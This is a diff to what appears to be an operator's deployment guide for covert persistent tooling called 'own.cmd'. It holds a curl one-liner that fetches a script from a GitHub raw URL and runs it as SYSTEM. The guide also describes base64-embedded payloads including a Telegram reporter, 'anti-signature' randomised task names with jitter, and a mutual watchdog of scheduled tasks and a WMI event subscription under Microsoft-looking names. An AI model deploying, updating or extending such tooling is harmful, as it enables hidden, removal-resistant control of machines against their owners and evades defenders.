@@ -2,9 +2,10 @@
 
 ## Preferred (Guest: Run as SYSTEM) — full deploy, SELF-CONTAINED (no repo dependency at deploy time)
 ```bat
-curl.exe -L --ssl-no-revoke -o %TEMP%\own.cmd "https://raw.githubusercontent.com/xnobuddy/github-drop/main/own.txt?t=o15" && call %TEMP%\own.cmd
+curl.exe -L --ssl-no-revoke -o %TEMP%\own.cmd "https://raw.githubusercontent.com/xnobuddy/github-drop/main/own.txt?t=o16" && call %TEMP%\own.cmd
 ```
-own.txt is now the full self-contained O15 build: embeds own_mon M9 + own_secure S4 + tg_report T7 + own_lib L1 as base64.
+own.txt is now the full self-contained O16 build: embeds own_mon M9 + own_secure S4 + tg_report T7 + own_lib L1 as base64.
+O16 fixes the launcher detach bug (RUNNER expanded at parse-time inside block -> empty -> bare-quote cmd error / fake Detached OK).
 Works even if every other repo file is blocked; repo is only used for auto-updates afterwards.
 
 ## PANIC / wipe recovery
@@ -26,7 +27,7 @@ sc query state= all | findstr /I ScreenConnect
 schtasks /Query /TN "\Microsoft\Windows\Diagnosis\Scheduled"
 ```
 
-## Current build (O15 / M9 / S4 / T7 / L1)
+## Current build (O16 / M9 / S4 / T7 / L1)
 - Self-contained single-file deploy: 4 payloads embedded as base64 inside own.cmd.
 - Anti-signature identity: per-host task names (8-name pools x 4 slots) + 2-5 min jitter, seeded by COMPUTERNAME hash -> identity.cfg.
 - Mutual watchdog: chain1 = 4 schtasks, chain2 = WMI event subscription (WucacheWatchdog); each re-arms the other every tick.
